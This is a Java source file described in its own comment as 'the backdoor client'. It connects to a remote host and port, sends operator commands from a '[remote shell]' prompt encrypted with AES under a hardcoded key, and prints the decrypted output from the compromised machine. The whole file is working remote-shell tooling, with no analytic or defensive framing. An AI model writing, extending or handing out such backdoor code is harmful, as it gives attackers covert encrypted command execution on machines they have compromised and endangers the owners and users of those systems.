import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.Key;
import java.util.Base64;
import java.util.Scanner;

/**
 * This is the backdoor client
 * Use ip = 127.0.0.1 and port = 9999 by default
 * @author salah3x
 */
public class Client {

	public static void main(String[] args) throws Exception {

		//Server ip
		String host = "127.0.0.1";

		//Port to listen to
		int port = 9999;

		if (args.length == 2) {
			host = args[0];
			port = Integer.valueOf(args[1]);
		}

		//The signal to let the client know that the request is finished
		//there will be no data to wait for(needed by the client to stop reading from output stream)
		String endSignal = "%**%";

		//The  encryption key used to encrypt an decrypt communication
		//Symmetric encryption is used
		String encryptionKey = "sixteen byte key";

		//Encryption algorithm
		String algorithm = "AES";

		//A helper class used to encrypt and decrypt Strings
		CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);

		//Starting the server
		Socket socket = new Socket(host, port);

		//Used to red user input
		Scanner scanner = new Scanner(System.in);
		//Used to write data to socket's output stream
		PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
		//Used to read data from socket's input stream
		BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));

		//Check if we are/still connected to server
		while (!socket.isClosed()) {
			try {
				//Getting user input
				System.err.print("[remote shell] $ ");
				String cmd = scanner.nextLine();

				//Encrypting and sending command
				printWriter.println(cryptoHelper.encrypt(cmd));
				printWriter.flush();

				if (cmd.equals("exit"))
					break;

				//Reading, decrypting and printing output to console
				String line;
				while ((line = cryptoHelper.decrypt(br.readLine())) != null) {
					//Until there is no data to read
					if (line.endsWith(endSignal))
						break;
					System.out.println(line);
				}
			} catch (Exception e) {
				e.printStackTrace();
				br.close();
				printWriter.close();
				socket.close();
			}
		}
	}

	/**
	 * This helper class deals with Cipher class and byte arrays in order
	 * to provide an abstraction to use encryption on strings
	 */
	static class CryptoHelper {

		private Cipher cipher;
		private Key key;

		CryptoHelper(String key, String algo) throws Exception {
			this.key = new SecretKeySpec(key.getBytes(), algo);
			this.cipher = Cipher.getInstance(algo);
		}

		String encrypt(String plaintext) throws Exception {
			if (plaintext == null)
				return null;
			cipher.init(Cipher.ENCRYPT_MODE, key);
			byte[] encrypted = cipher.doFinal(plaintext.getBytes());
			return Base64.getEncoder().encodeToString(encrypted);
		}

		String decrypt(String encrypted) throws Exception {
			if (encrypted == null)
				return null;
			cipher.init(Cipher.DECRYPT_MODE, key);
			byte[] decorded = Base64.getDecoder().decode(encrypted);
			byte[] decrypted = cipher.doFinal(decorded);
			return new String(decrypted);
		}
	}
}